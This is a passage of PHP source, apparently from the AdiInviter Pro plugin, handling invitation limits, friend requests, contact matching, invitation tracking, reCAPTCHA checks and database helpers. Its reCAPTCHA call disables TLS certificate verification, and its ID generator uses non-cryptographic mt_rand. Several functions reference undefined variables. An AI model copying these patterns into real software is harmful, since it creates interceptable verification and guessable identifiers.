			if($this->user_system && $this->adiinviter_installed && $usergroupid != $guest_usergroup_id &&
				(strtolower($new_num_invites) == 'unlimited' || is_numeric($new_num_invites)) )
			{
				$last_perms = $this->permissions->getPermsForUsergroup($usergroupid);
				if($last_perms[$this->last_num_invites_ind] == $new_num_invites)
				{
					$this->trace('Num_invites for usergroup = '.$usergroupid.' is already set.');
					return false;
				}
				if($this->usergroup_system == true)
				{
					if(!empty($this->user_fields['usergroupid']) )
					{
						return adi_build_query_write('update_invites_limit', array(
							'user_table'   => $this->user_table,
							'num_invites'  => $new_num_invites,
							'field_name'   => $this->user_fields['usergroupid'],
							'field_value'  => $usergroupid,
						));
					}
					else if(!empty($this->usergroup_mapping_table) && !empty($this->usergroup_mapping_fields['userid']) && !empty($this->usergroup_mapping_fields['usergroupid']))
					{
						return adi_build_query_write('update_invites_limit_mapping', array(
							'user_table'   => $this->user_table,
							'user_userid_field'   => $this->user_fields['userid'],
							'usergroup_mapping_table' => $this->usergroup_mapping_table,
							'mapping_userid_field'   => $this->usergroup_mapping_fields['userid'],
							'mapping_usergroupid_field'   => $this->usergroup_mapping_fields['usergroupid'],
							'num_invites'  => $new_num_invites,
							'usergroupid'  => $usergroupid,
						));
					}
				}
				else
				{
					return adi_build_query_write('update_invites_limit_all', array(
						'user_table'  => $this->user_table,
						'num_invites' => $new_num_invites,
					));
				}
			}
			$this->trace('Failed to update num_invites for usergroupid : '.$usergroupid);
			return false;
		}
		function getAllUsergroupsInfo()
		{
			$this->requireSettingsList('db_info');

			$guest_usergroup_id = $this->getGuestUsergroupId();
			$usergroups = array(
				$guest_usergroup_id => 'All users',
			);
			if($this->user_system === true)
			{
				$guest_usergroup_id = $this->getGuestUsergroupId();
				$guest_usergroup_id = empty($guest_usergroup_id) ? 0 : $guest_usergroup_id;

				$users_usergroup_id = ($guest_usergroup_id != 1) ? 1 : 2;

				$usergroups = array(
					$guest_usergroup_id => 'Unregistered/Not Loggedin Users',
					$users_usergroup_id => 'Regisered Users'
				);
				if($this->usergroup_system == true)
				{
					if(!empty($this->usergroup_table) && !empty($this->usergroup_fields['usergroupid']) && !empty($this->usergroup_fields['name']))
					{
						$result = adi_build_query_write('get_usergroups_details', array(
							'usergroup_table' => $this->usergroup_table,
						));
						if($row = adi_fetch_array($result))
						{
							$usergroups = array();
							do {
								$usergroups[$row[$this->usergroup_fields['usergroupid']]] = $row[$this->usergroup_fields['name']];
							}while($row = adi_fetch_array($result));
						}
					}
				}
			}

			$this->trace('Usergroup info. for '.count($usergroups).' usergroups.');
			return $usergroups;
		}
		function getLoggedInUsergroupId()
		{
			return $this->usergroupid;
		}
		function getGuestUsergroupId()
		{
			return $this->default_usergroupid;
		}
	// Search user functions
		function searchUserByUsername($username = '')
		{
			if($this->user_system)
			{
				$this->requireSettingsList(array('global','db_info'));
				if($username != '')
				{
					$result = adi_build_query_read('get_username_details', array(
						'user_table'     => $this->user_table,
						'username_field' => $this->user_fields['username'],
						'username_value' => $username,
					));
					if($row = adi_fetch_array($result))
					{
						$userid = $row[$this->user_fields['userid']];
						$user = $this->getUserInfo($userid);
						return $user;
					}
				}
			}
			$this->trace('User with username '.$username.' not found.');
			return false;
		}

	// Friends Requests
		function send_friend_request($userid, $ids_list)
		{
			$result = array();
			if($this->friends_system === true && count($ids_list) > 0)
			{
				$fr_table  = $this->friends_table;
				$fr_fields = $this->friends_fields;
				foreach($ids_list as $fr_id)
				{
					if(is_numeric($fr_id))
					{
						$s = adi_build_query_read('check_friend_request', array(
							'friend_table'   => $fr_table,
							'userid_field'   => $fr_fields['userid'],
							'userid'         => $userid,
							'friendid_field' => $fr_fields['friend_id'],
							'friendid'       => $fr_id,
						));

						if($r = adi_fetch_array($s))
						{
						// Request already exists.
						}
						else
						{
							$this->add_friend_request_record($userid, $fr_id);
						}
						$result[$fr_id] = true;
					}
					else
					{
						$result[$fr_id] = false;
					}
				}
			}
			return $result;
		}
		function add_friend_request_record($my_id , $friend_id)
		{
			$fr_table = $this->friends_table;
			$fr_fields = $this->friends_fields;
			if(!empty($fr_fields['status']))
			{
				return adi_build_query_write('friend_request_with_status', array(
					'friend_table'   => $fr_table,
					'userid_field'   => $fr_fields['userid'],
					'friendid_field' => $fr_fields['friend_id'],
					'status_field'   => $fr_fields['status'],
					'userid'         => $my_id,
					'friendid'       => $friend_id,
					'status_value'   => $fr_fields['pending_value'],
				));
			}
			else
			{
				return adi_build_query_write('friend_request', array(
					'friend_table'   => $fr_table,
					'userid_field'   => $fr_fields['userid'],
					'friendid_field' => $fr_fields['friend_id'],
					'userid'         => $my_id,
					'friendid'       => $friend_id,
				));
			}
		}



	// Contacts Parsing
		function getRegisteredContacts(&$contacts, &$registered_contacts, &$info, &$config)
		{
			$config['registered_count'] = 0;
			$config['pending_requests_count'] = 0;
			$config['my_friends_count'] = 0;

			if($this->user_system !== true || count($contacts) == 0)
			{
				return false;
			}

			$userid_field   = $this->user_fields['userid'];
			$username_field = $this->user_fields['username'];
			$email_field    = $this->user_fields['email'];
			$ids = array();

			if($config['email'] === 1)
			{
				$result = adi_build_query_read('get_email_details', array(
					'user_table'  => $this->user_table,
					'email_field' => $email_field,
					'emails_list' => array_keys($contacts),
				));

				while($row = adi_fetch_array($result))
				{
					if(isset($contacts[$row[$email_field]]))
					{
						$opts = array(
							'userid' => $row[$userid_field],
							'username' => $row[$username_field],
							'email' => $row[$email_field]
						);

						$info[$row[$userid_field]] = array(
							'userfullname' => $this->get_userfullname($row),
							'username' => $row[$username_field],
							'avatar'   => $this->_getUserAvatarUrl($row[$userid_field],$row[$username_field],$row[$email_field]),
							'profile_page_url' => $this->getProfilePageURL($opts)
						);

						$registered_contacts[$row[$userid_field]] = array(
							'name' => $contacts[$row[$email_field]]['name'],
							'email' => $row[$email_field],
							'friends' => array(),
						'friend_status' => 0,  // 0: No, 1: Pending, 2: Yes.
					);
					if(!in_array($row[$email_field], $ids)) {
						$ids[$row[$userid_field]] = $row[$email_field];
					}
					$config['registered_count']++;
					unset($contacts[$row[$email_field]]);
				}
			}
		}
		else
		{
			$result = adi_build_query_read('get_socialid_details', array(
				'socialids_list' => array_keys($contacts),
			));
			while($row = adi_fetch_array($result))
			{
				if(!isset($ids[$row['receiver_userid']]))
				{
					$ids[$row['receiver_userid']] = $row['receiver_social_id'];
				}
			}

			if(count($ids) > 0)
			{
				$result = adi_build_query_read('get_userids_details', array(
					'user_table'   => $this->user_table,
					'userid_field' => $userid_field,
					'userids'      => array_keys($ids),
				));

				while($row = adi_fetch_array($result))
				{
					$receiver_social_id = $ids[$row[$userid_field]];
					if(isset($contacts[$receiver_social_id]))
					{
						$opts = array(
							'userid'   => $row[$userid_field],
							'username' => $row[$username_field],
							'email'    => $row[$email_field]
						);

						$info[$row[$userid_field]] = array(
							'userfullname' => $this->get_userfullname($row),
							'username' => $row[$username_field],
							'avatar'   => $this->_getUserAvatarUrl($row[$userid_field], $row[$username_field], $row[$email_field]),
							'profile_page_url' => $this->getProfilePageURL($opts)
						);
						$registered_contacts[$row[$userid_field]] = array(
							'name' => $contacts[$receiver_social_id]['name'],
							'email' => $row[$email_field],
							'friends' => array(),
							'friend_status' => 0,  // 0: No, 1: Pending, 2: Yes.
						);
						$config['registered_count']++;
						unset($contacts[$receiver_social_id]);
					}
				}
			}
		}

		if($this->friends_system == true && $this->userid !== 0 && count($info) > 0 && count($registered_contacts) > 0)
		{
			$frnd_userid_value    = $this->friends_fields['userid'];
			$frnd_friend_id_value = $this->friends_fields['friend_id'];
			$frnd_status_value    = $this->friends_fields['status'];

			// Get all of my "accepted" friends and remove "pending" ones.
			$my_friends = array();
			$result = adi_build_query_read('get_user_friends', array(
				'friends_table'  => $this->friends_table,
				'userid_field'   => $frnd_userid_value,
				'friendid_field' => $frnd_friend_id_value,
				'userid'         => $this->userid,
			));

			while($row = adi_fetch_assoc($result))
			{
				$friend_id = ($row[$frnd_userid_value] == $this->userid ) ? $row[$frnd_friend_id_value] : $row[$frnd_userid_value];
				$is_friend = false;
				if(!empty($frnd_status_value))
				{
					if($row[$frnd_status_value] == trim($this->friends_fields['yes_value'],'\'"'))
					{
						$is_friend = true;
					}
					else if(isset($registered_contacts[$friend_id]))
					{
						$config['pending_requests_count']++;
						unset($registered_contacts[$friend_id]);
						unset($ids[$friend_id]);
					}
				}
				else
				{
					$is_friend = true;
				}

				if($is_friend)
				{
					$my_friends[] = $friend_id;
					if(isset($registered_contacts[$friend_id]))
					{
						$config['my_friends_count']++;
						unset($registered_contacts[$friend_id]);
						unset($ids[$friend_id]);
					}
				}
			}

			// Find Mutual Friends
			if(count($my_friends) > 0)
			{
				$mutual_friends = array();
				if(empty($frnd_status_value))
				{
					$result = adi_build_query_read('get_mutual_friends', array(
						'friends_table'  => $this->friends_table,
						'userid_field'   => $frnd_userid_value,
						'userids'        => array_keys($ids),
						'friendid_field' => $frnd_friend_id_value,
						'friendids'      => $my_friends,
					));
				}
				else
				{
					$result = adi_build_query_read('get_mutual_friends_status', array(
						'friends_table'  => $this->friends_table,
						'userid_field'   => $frnd_userid_value,
						'userids'        => array_keys($ids),
						'friendid_field' => $frnd_friend_id_value,
						'friendids'      => $my_friends,
						'status_field'   => $frnd_status_value,
						'status_value'   => $this->friends_fields['yes_value'],
					));
				}

				while($row = adi_fetch_array($result))
				{
					$id = $ids[$row[$frnd_userid_value]];
					if(!in_array($row[$frnd_friend_id_value], $mutual_friends))
					{
						$mutual_friends[] = $row[$frnd_friend_id_value];
					}
					if(!in_array($row[$frnd_friend_id_value], $registered_contacts[$row[$frnd_userid_value]]['friends']))
					{
						$registered_contacts[$row[$frnd_userid_value]]['friends'][] = $row[$frnd_friend_id_value];
					}
				}

				// Get Mutual friends information.
				if(count($mutual_friends) > 0)
				{
					$result = adi_build_query_read('get_userids_details', array(
						'user_table'   => $this->user_table,
						'userid_field' => $this->user_fields['userid'],
						'userids'      => $mutual_friends,
					));
					while($row = adi_fetch_array($result))
					{
						if(!isset($info[$row[$this->user_fields['userid']]]))
						{
							$opts = array(
								'userid'   => $row[$this->user_fields['userid']],
								'username' => $row[$this->user_fields['username']],
								'email'    => $row[$this->user_fields['email']]
							);
							$info[$row[$this->user_fields['userid']]] = array(
								'userfullname' => $this->get_userfullname($row),
								'username' => $row[$this->user_fields['username']],
								'avatar'   => $this->_getUserAvatarUrl($row[$this->user_fields['userid']], $row[$this->user_fields['username']], $row[$this->user_fields['email']]),
								'profile_page_url' => $this->getProfilePageURL($opts)
							);
						}
					}
				}
			}
		}
	}


	function getInvitedContacts(&$contacts, &$config)
	{
		$config['all_non_registered_count'] = count($contacts);
		$config['blocked_count'] = 0;
		$config['waiting_count'] = 0;
		$config['sent_count'] = 0;

		if($this->adiinviter_installed !== true)
		{
			return false;
		}

		// Make chunks
		$final_contacts = array();
		if(count($contacts) > 100) {
			$final_contacts = array_chunk($contacts, 100, true);
		}
		else {
			$final_contacts = array($contacts);
		}

		foreach($final_contacts as $conts)
		{
			//waiting, invitation_sent, blocked, accepted, registered
			if((int)$config['email'] == 1)
			{
				$id_field = 'receiver_email';
				$result = adi_build_query_read('get_invs_to_emails', array(
					'emails_list' => array_keys($conts),
				));
			}
			else
			{
				$id_field = 'receiver_social_id';
				$result = adi_build_query_read('get_invs_to_socialids', array(
					'socialids_list' => array_keys($conts),
					'service_id'     => $config['service_key']
				));
			}

			while($row = adi_fetch_array($result))
			{
				if($row['invitation_status'] == 'blocked')
				{
					$contacts[$row[$id_field]]['status'] = 'blocked';
					unset($conts[$row[$id_field]]);
					if($this->show_blocked_contacts != 1)
					{
						unset($contacts[$row[$id_field]]);
					}
					$config['blocked_count']++;
				}
				else if($row['inviter_id'] == $this->userid && $this->userid != 0)
				{
					if($row['campaign_id'] == $config['campaign_id'] && $row['content_id'] == $config['content_id'])
					{
						$contacts[$row[$id_field]]['status'] = $row['invitation_status'];
					}
					switch($row['invitation_status'])
					{
						case 'waiting':
						if($row['campaign_id'] == $config['campaign_id'] && $row['content_id'] == $config['content_id'] && $this->settings['adiinviter_invite_already_invited'] == 0)
						{
							unset($conts[$row[$id_field]]);
							unset($contacts[$row[$id_field]]);
							$config['waiting_count']++;
						}
						break;
						case 'invitation_sent':
						if($row['campaign_id'] == $config['campaign_id'] && $row['content_id'] == $config['content_id'] && $this->settings['adiinviter_invite_already_invited'] == 0)
						{
							unset($conts[$row[$id_field]]);
							unset($contacts[$row[$id_field]]);
							$config['sent_count']++;
						}
						break;
						default :
						if($row['campaign_id'] == $config['campaign_id'] && $row['content_id'] == $config['content_id'])
						{
							unset($conts[$row[$id_field]]);
						}
						break;
					}
				}
			}
		}
		$config['non_registered_count'] = count($contacts);
	}

	function get_invitation_details($invitation_id)
	{
		$result = adi_build_query_read('get_invitation_details', array(
			'invitation_ids' => array($invitation_id)
		));
		if($inv_details = adi_fetch_assoc($result))
		{
			return $inv_details;
		}
		return false;
	}

	function set_as_registered($invitation_id = null, $userid = null)
	{
		// Validate Input
		$this->requireSettingsList(array('global','db_info'));
		if(!($this->adiinviter_installed && $this->user_system))
		{
			$this->trace('Failed to mark as registered(invitation_id = '.$invitation_id.', userid = '.($userid).')');
			return false;
		}

		$result = false; $social_id = ''; $email = '';
		$invitation_info = $user_info = $sess_inv_info = null;

		// Fetch User Info
		if(!is_null($userid)) {
			$user_info = $this->getUserInfo($userid, true, false);
			if(!$user_info) { $user_info = null; }
		}

		// Fetch Parameter Invitation_id Info
		if(!is_null($invitation_id))
		{
			$result = adi_build_query_read('get_invitation_details', array(
				'invitation_ids' => array($invitation_id),
			));
			if($inv_details = adi_fetch_assoc($result))
			{
				$invitation_info = $inv_details;
			}
		}

		// Fetch Session Invitation_id Info
		$session_invitation_id = $this->session->get('adi_invitation_id');
		if(!empty($session_invitation_id))
		{
			$result = adi_build_query_read('get_invitation_details', array(
				'invitation_ids' => array($session_invitation_id),
			));
			if($inv_details = adi_fetch_assoc($result))
			{
				$sess_inv_info = $inv_details;
			}
		}

		if(is_null($user_info) && is_null($invitation_info) && is_null($sess_inv_info)) {
			return false;
		}

		$inviter_ids   = array();
		$user_table    = $this->user_table;
		$user_fields   = $this->user_fields;
		$invited_email = '';

		// If user is not specified
		if(is_null($user_info))
		{
			$em = '';
			if(!is_null($invitation_info)) {
				$em = $invitation_info['receiver_email'];
			}
			else if(!is_null($sess_inv_info)) {
				$em = $sess_inv_info['receiver_email'];
			}
			if(!empty($em))
			{
				$result = adi_build_query_read('get_email_details', array(
					'user_table'  => $user_table,
					'email_field' => $user_fields['email'],
					'emails_list' => array($em),
				));
				if($user_details = adi_fetch_assoc($result))
				{
					$invited_email = $em;
					$user_info = new stdClass();
					$user_info->userid   = $user_details[$user_fields['userid']];
					$user_info->username = $user_details[$user_fields['username']];
					$user_info->email    = $user_details[$user_fields['email']];
					if(!empty($user_fields['usergroupid']))
					{
						$user_info->usergroupid = $row[$user_fields['usergroupid']];
					}
					else
					{
						$user_info->usergroupid = $this->getUsergroupId($user_info->userid);
					}
				}
			}
			if(is_null($user_info)) {
				return false;
			}
		}

		if(is_null($invitation_info) && is_null($sess_inv_info))
		{
			$result = adi_build_query_read('get_invs_to_emails', array(
				'emails_list' => array($user_info->email),
			));
			if($row = adi_fetch_assoc($result))
			{
				$invitation_info = $row;
			}
		}

		if(is_null($invitation_info)) {
			$invitation_info = $sess_inv_info;
		}
		if(!is_null($invitation_info))
		{
			$this->trace('Invitation id "'.$invitation_info['invitation_id'].'" is claimed by userid : '.$user_info->userid);

			if($invitation_info['inviter_id'] != 0)
			{
				$inviter_ids[] = $invitation_info['inviter_id'];
			}

			// Marks as Accepted
			$query_params = array(
				'username'      => $user_info->username,
				'userid'        => $user_info->userid,
				'email'         => $user_info->email,
				'invitation_id' => $invitation_info['invitation_id'],
			);
			if($result = adi_build_query_write('mark_invite_as_registered', $query_params))
			{
				$this->trace('Invitation with id "'.$invitation_info['invitation_id'].'" has been accepted by user with userid '.$user_info->userid);

				if($invitation_info['invitation_status'] !== 'accepted')
				{
					adi_call_event('invitation_accepted', array(
						'invitation_info' => $invitation_info,
						'receiver_userinfo' => $user_info,
					));
				}
			}

			// Assign number of invitations limit
			$limit = 'Unlimited';
			if($this->usergroup_system === true)
			{
				$perms = $this->permissions->getPermsForUsergroup($user_info->usergroupid);
				$limit = $perms[$this->last_num_invites_ind];
			}
			adi_build_query_write('update_invites_limit', array(
				'user_table'  => $user_table,
				'num_invites' => $limit,
				'field_name'  => $user_fields['userid'],
				'field_value' => $user_info->userid,
			));

			// Add inviters as friend(s)
			if($this->friends_system === true)
			{
				$result = false;
				if(!empty($invitation_info['inviter_id']))
				{
					$result = adi_build_query_read('get_invs_to_emails', array(
						'emails_list' => array($invitation_info['receiver_email']),
					));
				}
				else if(!empty($social_id))
				{
					$result = adi_build_query_read('get_invs_to_socialids', array(
						'socialids_list' => array($invitation_info['receiver_social_id']),
						'service_id'     => $invitation_info['service_used'],
					));
				}
				if($result)
				{
					while($row = adi_fetch_assoc($result))
					{
						if($row['inviter_id'] != 0 && !in_array($row['inviter_id'], $inviter_ids))
						{
							$inviter_ids[] = $row['inviter_id'];
						}
					}
				}
				$inviter_ids = array_unique($inviter_ids);
				$this->send_friend_request($user_info->userid, $inviter_ids);
			}
		}

		if(!is_null($user_info))
		{
			// Check Guest details for email address.
			if(!empty($user_info->email))
			{
				$guest_res = adi_build_query_read('check_guest_id', array(
					'field_name'  => 'email',
					'field_value' => $user_info->email,
				));
				if($guest_row = adi_fetch_array($guest_res))
				{
					adi_build_query_write('update_invitations', array(
						'update_field' => 'inviter_id',
						'update_value' => $user_info->userid,
						'check_field'  => 'guest_id',
						'check_value'  => $guest_row['guest_id'],
					));

					adi_build_query_write('update_invitations', array(
						'update_field' => 'guest_id',
						'update_value' => '0',
						'check_field'  => 'guest_id',
						'check_value'  => $guest_row['guest_id'],
					));

					adi_build_query_write('delete_guest_details', array(
						'field_name'  => 'guest_id',
						'field_value' => $guest_row['guest_id'],
					));
				}
			}
		}
		return $result;
	}

	function set_as_registered_by_email($email)
	{
		if(empty($email))
		{
			return false;
		}
		$result = adi_build_query_read('get_invs_to_emails', array(
			'emails_list' => array($email),
		));

		if($row = adi_fetch_array($result))
		{
			$invitation_id = $row['invitation_id'];
			$receiver_userid = $row['receiver_userid'];
			if($receiver_userid != 0)
			{
				return $this->set_as_registered($invitation_id, $receiver_userid);
			}
		}
		return false;
	}

	function mark_as_visited($invitation_id)
	{
		if(empty($invitation_id)) {
			return false;
		}

		$invitation_info = array();

		if($result = adi_build_query_read('get_invitation_details', array(
			'invitation_ids' => array($invitation_id),
		)))
		{
			if($row = adi_fetch_assoc($result))
			{
				$invitation_info = $row;

				$update_result = adi_build_query_write('update_invitations', array(
					'update_field' => 'visited',
					'update_value' => 1,
					'check_field'  => 'invitation_id',
					'check_value'  => $invitation_id,
				));

				if($invitation_info['visited']+0 === 0)
				{
					adi_call_event('receiver_visited', array(
						'invitation_info' => $invitation_info,
					));
				}
				return $update_result;
			}
		}

		return false;
	}

	// AdiInviter Mail Queue related functions
	function getMailQueueCount()
	{
		$this->requireSettingsList('db_info');
		$mq_count = 0;

		$result = adi_build_query_read('mail_queue_count');
		if($row = adi_fetch_array($result))
		{
			$mq_count = $row['cnt'];
		}
		$this->trace("Number of mails in the queue : ".$mq_count);
		return $mq_count;
	}

	// Misc
	function all_imported_contacts($config, &$contacts)
	{

	}

	function registered_contacts($config, &$info, &$registered_contacts, &$not_registered_contacts)
	{

	}

	function check_for_topic_redirect()
	{
		if($this->user_system && $this->userid !== 0)
		{
			$campaign_id = '';
			if($result = adi_build_query_read('check_user_redirection', array(
				'field_name' => 'receiver_userid',
				'field_value' => $this->userid,
			)))
			{
				if($row = adi_fetch_array($result))
				{
					$campaign_id = isset($row['campaign_id']) ? $row['campaign_id'] : '';
				}
			}

			if(!empty($campaign_id))
			{
				$settings = adi_getSetting('campaign_'.$campaign_id, 'redirection_on_off');
				if($settings+0 === 1)
				{
					return true;
				}
			}
		}
		return false;
	}

	function get_service_config($service_key)
	{
		$config = array();
		if(!empty($service_key))
		{
			$adi_services = adi_allocate_pack('Adi_Services');
			$adiinviter_services = $adi_services->get_service_details($service_key);
			if(isset($adiinviter_services[$service_key]))
			{
				$config = $adiinviter_services[$service_key]['info'];
				$config['service_key'] = $service_key;
			}
		}
		return $config;
	}

	final function get_unique_id($length = 10)
	{
		$hash = "";
		if(is_numeric($length))
		{
			mt_srand();
			$possible = '0123456789'.'abcdefghjiklmnopqrstuvwxyz'.'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
			$last_ind = strlen($possible) - 1;
			while(strlen($hash) < $length)
			{
				$hash .= substr($possible, mt_rand(0, $last_ind), 1);
			}
		}
		return $hash;
	}

	function verify_recaptcha_response($response)
	{
		$url = 'https://www.google.com/recaptcha/api/siteverify';
		$fields = array(
			'secret'   => $this->settings['captcha_private_key'],
			'response' => $response,
			'remoteip' => $_SERVER['REMOTE_ADDR'],
		);

		$fields_string = $sep = '';
		foreach($fields as $key=>$value) {
			$fields_string .= $sep.$key.'='.$value;
			$sep='&';
		}

		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_POST, count($fields));
		curl_setopt($ch, CURLOPT_POSTFIELDS, $fields_string);

		curl_setopt($ch, CURLOPT_HEADER, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);

		$result = curl_exec($ch);
		curl_close($ch);

		$result = (array)@json_decode($result);
		if(isset($result['success']) && $result['success'] == true)
		{
			return true;
		}
		return false;
	}


	function add_to_mail_queue($invitation_id = '', $receiver_email = '', $mail_subject = '', $mail_body = '', $sender_info = array())
	{
		$sender_info_json = adi_json_encode($sender_info);
		adi_build_query_write('add_to_mail_queue', array(
			'invitation_id'  => $invitation_id,
			'receiver_email' => adi_escape_string($receiver_email),
			'mail_subject'   => adi_escape_string($mail_subject),
			'mail_body'      => adi_escape_string($mail_body),
			'sender_info'    => adi_escape_string($sender_info_json),
		));
		adi_build_query_write('update_invite_status', array(
			'status' => 'waiting',
			'invitation_id' => $invitation_id,
		));
		return true;
	}

}// end of class def AdiInviterPro_Base


function adi_connect_to_db($hostname, $username, $password, $dbname_or_error_report = null, $error_report = false)
{
	global $adiinviter;
	$result = $adiinviter->db->adi_connect_to_db($hostname, $username, $password, $dbname_or_error_report, $error_report);
	if($result == true) {
		$adiinviter->trace('Database connection established.');
	}
	return $result;
}

function adi_escape_string($value)
{
	global $adiinviter;
	if($adiinviter->db_allowed === true)
	{
		return $adiinviter->db->adi_escape_string($value);
	}
	else {
		$adiinviter->trace('Not connected to Database.');
		return $value;
	}
}

function adi_build_query($query = '', $params = array(), $error_report = true)
{
	global $adiinviter;
	$result = false;
	if($adiinviter->db_allowed === true)
	{
		$result = $adiinviter->db->buildQuery($query, $params);
	}
	else {
		$adiinviter->trace('Not connected to Database('.$query.')');
	}
	return $result;
}
function adi_build_query_write($query = '', $params = array(), $error_report = true)
{
	global $adiinviter;
	$result = false;
	if($adiinviter->db_allowed === true)
	{
		$result = $adiinviter->db->buildAndWrite($query, $params);
	}
	else {
		$adiinviter->trace('Not connected to Database('.$query.')');
	}
	return $result;
}
function adi_build_query_read($query = '', $params = array(), $error_report = true)
{
	global $adiinviter;
	$result = false;
	if($adiinviter->db_allowed === true)
	{
		$result = $adiinviter->db->buildAndRead($query, $params);
	}
	else {
		$adiinviter->trace('Not connected to Database('.$query.')');
	}
	return $result;
}
function adi_query_read($query = '', $error_report = true)
{
	global $adiinviter;
	$result = false;
	if($adiinviter->db_allowed === true)
	{
		$result = $adiinviter->db->adi_query_read($query, $error_report);
		if($result == false)
		{
			$adiinviter->throwErrorDesc('fn.adi_query_read : Query failed to execute : ' . $query . ' : ' . $adiinviter->db->adi_get_error());
		}
	}
	else {
		$adiinviter->trace('Not connected to Database('.$query.')');
	}
	return $result;
}

function adi_fetch_array($pointer, $error_report = true)
{
	global $adiinviter;
	$result = false;
	if($adiinviter->db_allowed === true)
	{
		if($pointer)
		{
			$result = $adiinviter->db->adi_fetch_array($pointer, $error_report);
		}
		else {
			$adiinviter->throwErrorDesc('fn.adi_fetch_array : Invalid MySqli Resource!! Can not fetch the values.');
		}
	}
	else {
		$adiinviter->trace('Not connected to Database');
	}
	return $result;
}

function adi_fetch_assoc($pointer, $error_report = true)
{
	global $adiinviter;
	$result = false;
	if($adiinviter->db_allowed === true)
	{
		if($pointer)
		{
			$result = $adiinviter->db->adi_fetch_assoc($pointer, $error_report);
		}
		else {
			$adiinviter->throwErrorDesc('fn.adi_fetch_assoc : Invalid MySqli Resource!! Can not fetch the values.');
		}
	}
	else {
		$adiinviter->trace('Not connected to Database');
	}
	return $result;
}

function adi_query_write($query = '', $error_report = true)
{
	global $adiinviter;
	$result = false;
	if($adiinviter->db_allowed === true)
	{
		$result = $adiinviter->db->adi_query_write($query, $error_report);
		if($result == false)
		{
			$adiinviter->throwErrorDesc('fn.adi_query_write : Query failed to execute : ' . $query . ' : ' . $adiinviter->db->adi_get_error());
		}
	}
	else {
		$adiinviter->trace('Not connected to Database('.$query.')');
	}
	return $result;
}

function adi_free_result($pointer = '', $error_report = true)
{
	global $adiinviter;
	if($adiinviter->db_allowed === true)
	{
		if($pointer)
		{
			return $adiinviter->db->adi_free_result($pointer, $error_report);
		}
		else
		{
			$adiinviter->throwErrorDesc('fn.adi_free_result : Invalid MySqli Resource!! Can not free result.');
		}
	}
	else {
		$adiinviter->trace('Not connected to Database()');
	}
	return $result;
}


function adi_getSetting($sg_name, $name = '')
{
	global $adiinviter;
	$val = '';

	$adiinviter->trace("Requesting setting value by name : ".$name);
	if($name == '')
	{
		$result = adi_build_query_read('fetch_setting_groups', array(
			'setting_group_ids' => array($sg_name),
		));
		$ret_val = array();
		while($r = adi_fetch_array($result))
		{
			if(in_array($r['name'], $adiinviter->json_format_settings))
			{
				$ret_val[$r['name']] = adi_json_decode($r['value'], true);
			}
			else
			{
				$ret_val[$r['name']] = $r['value'];
			}
		}
		return $ret_val;
	}
	else
	{
		$result = adi_build_query_read('fetch_setting', array(
			'setting_name' => $name,
			'setting_group_ids' => array($sg_name)
		));
		if($row = adi_fetch_array($result))
		{
			if(in_array($row['name'], $adiinviter->json_format_settings))
			{
				return adi_json_decode($row['value'], true);
			}
			else
			{
				return $row['value'];
			}
		}
	}

	return false;
}

function adi_addSetting($sg_name, $name, $val = '')
{
	global $adiinviter;
	if(in_array($name, $adiinviter->json_format_settings))
	{
		if(is_array($val))
		{
			$val = adi_null_text(json_encode($val));
		}
	}
	return adi_build_query_write('add_setting', array(
		'setting_group_name' => $sg_name,
		'setting_name'       => $name,
		'setting_value'      => adi_escape_string($val),
	));
}

function adi_saveSetting($sg_name, $name, $val = '')
{
	global $adiinviter;
	if(isset($adiinviter->settings[$name])) {
		$adiinviter->settings[$name] = $val;
	}
	if(in_array($name, $adiinviter->json_format_settings))
	{
		if(is_array($val))
		{
			$val = adi_null_text(json_encode($val));
		}
	}
	// Do not change this query to "REPLACE INTO" query, use adi_addSetting() instead.
	return adi_build_query_write('update_setting', array(
		'setting_group_name' => $sg_name,
		'setting_name'       => $name,
		'setting_value'      => adi_escape_string($val),
	));
}

function adi_deleteSettings($sg_name, $name = '')
{
	global $adiinviter;
	if(empty($sg_name))
	{
		$adiinviter->trace('Invalid Settings group name.');
	}
	else
	{
		if($name != '') {
			adi_build_query_write('remove_setting', array(
				'setting_group_name' => $sg_name,
				'setting_name'       => $name,
			));
		}
		else {
			adi_build_query_write('remove_setting_group', array(
				'setting_group_name' => $sg_name,
			));
		}
	}
}

function adi_allocate_plugin($plugin_id, $settings = null)
{
	if(!class_exists('Adi_Scheduled_Plugin'))
	{
		include_once(ADI_LIB_PATH . 'adiinviter_plugins.php');
	}
	if(!class_exists($plugin_id))
	{
		$plugin_file = ADI_PLUGINS_PATH . $plugin_id . '.php';
		if(file_exists($plugin_file))
		{
			include_once($plugin_file);
		}
	}

	if(class_exists($plugin_id))
	{
		$obj = new $plugin_id;
		global $adiinviter;
		$obj->adi =& $adiinviter;

		if(is_null($settings))
		{
			$obj->settings = adi_getSetting($plugin_id);
		}
		else
		{
			$obj->settings = $settings;
		}
		return $obj;
	}
}

function adi_throwLibError($id)
{
	global $adiinviter;
	if(count($adiinviter->phrases) == 0)
	{
		$adiinviter->loadPhrases();
	}
	$error_phrases = array(
		'adiinviter_login_failed',               //0
		'adiinviter_no_contacts_in_addressbook', //1
		'adiinviter_no_friends',                 //2
		'adiinviter_unable_to_get_contacts',     //3
		'adiinviter_message_sending_failed',     //4
		'service_file_not_found',                //5
		'service_class_not_found',               //6
		'invalid_error_occurred',                //7
		'invalid_email_address',                 //8
		'adi_msg_empty_password',                //9
		'adi_importer_failed_adi101',            //10

		'adi_code_parameter_missing',            //11
		'adi_access_token_empty',                //12
		'adi_failed_to_get_access_token',        //13
	);
	if(isset($error_phrases[$id])) {
		$adiinviter->error->report_error($adiinviter->phrases[$error_phrases[$id]]);
	}
	else {
		$adiinviter->error->report_error($adiinviter->phrases[$error_phrases[7]]);
	}
}

function adi_throwError($err_phrase)
{
	global $adiinviter;
	$adiinviter->throwError($err_phrase);
}
function adi_throwErrorDesc($err_msg)
{
	global $adiinviter;
	$adiinviter->throwErrorDesc($err_msg);
}
function adiinviter_trace($desc)
{
	global $adiinviter;
	if(isset($adiinviter))
	{
		$adiinviter->trace($desc);
	}
}


function adi_allocate_pack($resource_name)
{
	$obj = adi_allocate($resource_name);
	global $adiinviter;
